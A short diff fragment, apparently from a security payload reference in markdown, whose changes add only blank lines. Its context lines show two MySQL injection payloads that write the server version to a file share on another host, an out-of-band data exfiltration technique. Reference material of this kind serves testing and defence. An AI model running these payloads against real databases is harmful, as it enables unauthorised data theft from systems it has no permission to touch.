@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:22:48.324121+00:00'
 select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
 select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt
 ```
+
+
